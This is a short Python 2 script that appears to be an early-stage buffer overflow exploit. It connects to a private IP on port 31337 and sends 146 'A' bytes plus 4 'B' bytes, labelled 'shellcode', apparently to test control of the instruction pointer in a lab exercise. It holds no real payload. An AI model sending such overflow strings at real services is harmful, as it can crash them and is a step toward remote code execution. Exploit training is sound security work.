#!/usr/bin/python
import sys
import socket

shellcode = "A" * 146 + "B" * 4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect = s.connect(('10.11.23.92',31337))
	s.send(shellcode + '\r\n')
	s.recv(1024)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 